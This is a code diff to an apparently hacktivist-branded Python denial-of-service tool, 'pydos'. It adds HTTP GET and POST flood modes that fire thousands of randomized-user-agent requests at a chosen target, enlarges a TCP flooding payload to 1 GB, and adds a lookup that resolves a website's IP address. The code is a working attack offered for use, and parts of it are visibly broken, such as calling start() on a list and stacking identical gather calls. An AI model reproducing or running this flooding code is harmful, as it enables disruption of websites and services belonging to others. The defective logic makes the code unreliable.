@@ -44,7 +44,8 @@ def banner_main():
 ===========================================
 
        [1] Layer 7 ( DoS HTTP FLOOD )
-       [2] Layer 4 ( DoS TCP AttACK )''')
+       [2] Layer 4 ( DoS TCP AttACK )
+       [3] Checking Host IP Address ''')
 	print("")
 
 def banner_layer7():
@@ -84,7 +85,7 @@ def banner_layer4():
 # CHannel Telegram : t.me/AnonOpsNews
 # Website : anonsbreaking.blogspot.com
 # Website 2 : cyberkex-security.blogspot.com
-================================================''')
+	================================================''')
 	print("")
 
 # user agent
@@ -141,75 +142,236 @@ choose = input("Choose : ")
 if choose == "1":
 
 	banner_layer7()
-	target = input("target : ")
+	def choose_l7():
+		print("")
+		print("(1) [ DoS HTTP GET ]")
+		print("")
+		print("(2) [ DoS HTTP POST ]")
+		print("")
 
-	async def send_packet_l7(user_agent, send_packet_l7):
+	choose_l7()
+	choose_layer7 = input("Choose : ")
 
-		async with aiohttp.ClientSession() as session:
-			# start request User Agent
+	if choose_layer7 == "1":
 
-			for user_agents in user_agent:
-				user_agents = random.choice(user_agent)
-				headers = {"User-Agent": user_agents}
+		os.system('cls' if os.name == 'nt' else 'clear')
 
-				async with session.get(target, headers=headers) as request:
+		banner_layer7()
 
-					if request.status == 200:
-						print(Fore.GREEN + "[+] Packet Done")
-					else:
-						print(Fore.RED + "[!] Target Seized")
+		target = input("target : ")
 
-					await request.text()
-					time.sleep(0.00)
+		async def send_packet_l7(user_agent, send_packet_l7):
 
-	async def main():
-		num_packet_layer7 = int(input("Num Packet : "))
+			async with aiohttp.ClientSession() as session:
+				# start request User Agent
 
-		threads_layer7 = []
-		threads_usr_agent = []
+				for i in range(10000):
 
-		for i in range(num_packet_layer7):
-			task = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
-			socket = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
-			threads_layer7.append(task)
-			threads_usr_agent.append(socket)
+					for user_agents in user_agent:
+						user_agents = random.choice(user_agent)
+						headers = {"User-Agent": user_agents}
 
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
-	
+						async with session.get(target, headers=headers) as request:
 
-	if __name__ == '__main__':
-		loop = asyncio.get_event_loop()
-		loop.run_until_complete(main())
+							if request.status == 200:
+								print(Fore.GREEN + "[+] Packet Done")
+							else:
+								print(Fore.RED + "[!] Target Seized")
 
-		def socket_random():
-			num = socket_random + 1
-			response = requests.get(host, headers=headers)
-			print("Packet Done")
+							await request.text()
+							time.sleep(0.00)
+
+		async def main():
+			num_packet_layer7 = int(input("Num Packet : "))
+
+			threads_layer7 = []
+			threads_usr_agent = []
+
+			for i in range(num_packet_layer7):
+				task = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
+				socket = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
+				threads_layer7.append(task)
+				threads_usr_agent.append(socket)
+
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		
 
 		if __name__ == '__main__':
+			loop = asyncio.get_event_loop()
+			loop.run_until_complete(main())
 
-			packet = 5000
+			def socket_random():
+				num = socket_random + 1
+				response = requests.get(host, headers=headers)
+				print("Packet Done")
 
-			threads = []
+			if __name__ == '__main__':
 
-			for i in range(packet):
-				thread_packet = threading.Thread(target=socket_random, args=(host,))
-				threads.append(thread_packet)
+				packet = 5000
 
-			for thread_packet in threads:
-				threads.start()
+				threads = []
 
-			for thread_packet in threads:
-				threads.join()
+				for i in range(packet):
+					thread_packet = threading.Thread(target=socket_random, args=(host,))
+					threads.append(thread_packet)
 
-	print(Fore.BLUE + "KILLED")
+				for thread_packet in threads:
+					threads.start()
+
+				for thread_packet in threads:
+					threads.join()
+
+		print(Fore.BLUE + "KILLED")
+
+		print("")
+		print("Back Tools : [Y / N]")
+		back = input("Choose : ")
+
+		if back == "y":
+			os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+		elif back == "Y":
+			os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+		elif back == "n":
+			print("Thanks For Use Tools")
+			sys.exit()
+
+		elif back == "N":
+			print("Thanks FOr Use Tools")
+
+			sys.exit()
+
+	# Attacking POST
+
+	if choose_layer7 == "2":
+
+		os.system('cls' if os.name == 'nt' else 'clear')
+
+		banner_layer7()
+
+		target = input("target : ")
+
+		async def send_packet_l7(user_agent, send_packet_l7):
+
+			async with aiohttp.ClientSession() as session:
+				# start request User Agent
+
+				for i in range(10000):
+
+					for user_agents in user_agent:
+						user_agents = random.choice(user_agent)
+						headers = {"User-Agent": user_agents}
+
+						async with session.post(target, headers=headers) as request:
+
+							if request.status == 200:
+								print(Fore.GREEN + "[+] Packet Done")
+							else:
+								print(Fore.RED + "[!] Target Seized")
+
+							await request.text()
+							time.sleep(0.00)
+
+		async def main():
+			num_packet_layer7 = int(input("Num Packet : "))
+
+			threads_layer7 = []
+			threads_usr_agent = []
+
+			for i in range(num_packet_layer7):
+				task = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
+				socket = asyncio.ensure_future(send_packet_l7(user_agent, send_packet_l7))
+				threads_layer7.append(task)
+				threads_usr_agent.append(socket)
+
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+			
+			await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		
+
+		if __name__ == '__main__':
+			loop = asyncio.get_event_loop()
+			loop.run_until_complete(main())
+
+			def socket_random():
+				num = socket_random + 1
+				response = requests.post(host, headers=headers)
+				print("Packet Done")
+
+			if __name__ == '__main__':
+
+				packet = 5000
+
+				threads = []
+
+				for i in range(packet):
+					thread_packet = threading.Thread(target=socket_random, args=(host,))
+					threads.append(thread_packet)
+
+				for thread_packet in threads:
+					threads.start()
+
+				for thread_packet in threads:
+					threads.join()
+
+		print("KILLED")
+
+		print("")
+		print("Back Tools : [Y / N]")
+		back = input("Choose : ")
+
+		if back == "y":
+			os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+		elif back == "Y":
+			os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+		elif back == "n":
+			print("Thanks For Use Tools")
+			sys.exit()
+
+		elif back == "N":
+			print("Thanks FOr Use Tools")
+
+			sys.exit()
+
+
+
+	else:
+		def check_layer7():
+			print("")
+			print("[ {} ] Not Found ")
+			print("")
+
+		check_layer7()
+
 
 # Attacking Layer 4 
 
@@ -221,7 +383,7 @@ elif choose == "2":
 	data_packet = int(input("Num DATA : "))
 	num_packet_layer4 = int(input("Num Packet : "))
 
-	data = b"a" * (1024 * 1024 * 500) # Created 500 MB
+	data = b"a" * (1024 * 1024 * 1024) # Created 500 MB
 
 	def attacking(num_packet_layer4):
 		for i in range(num_packet_layer4):
@@ -249,6 +411,66 @@ elif choose == "2":
 	for t in threads_layer4:
 		t.join()
 
+	print("")
+	print("Back Tools : [Y / N]")
+	back = input("Choose : ")
+
+	if back == "y":
+		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+	elif back == "Y":
+		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+	elif back == "n":
+		print("Thanks For Use Tools")
+		sys.exit()
+
+	elif back == "N":
+		print("Thanks FOr Use Tools")
+
+		sys.exit()
+
+
+
+# Checking Host Address 
+
+elif choose == "3":
+	def banner_check_host():
+		print("")
+		print("DOnt Type http:// or https://")
+		print("")
+
+	banner_check_host()
+
+	address = input("website: ")
+
+	get_ip = socket.gethostbyname(address)
+
+	def check_host():
+		print("")
+		print("[+] IP ADDRESS : {}".format(get_ip))
+		print("")
+		print("[+] WEBSITE ADDRESS : {}".format(address))
+
+	check_host()
+	print("")
+	print("Back Tools : [Y / N]")
+	back = input("Choose : ")
+
+	if back == "y":
+		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+	elif back == "Y":
+		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
+
+	elif back == "n":
+		print("Thanks For Use Tools")
+		sys.exit()
+
+	elif back == "N":
+		print("Thanks FOr Use Tools")
+
+		sys.exit()
 
 else:
 	def check():
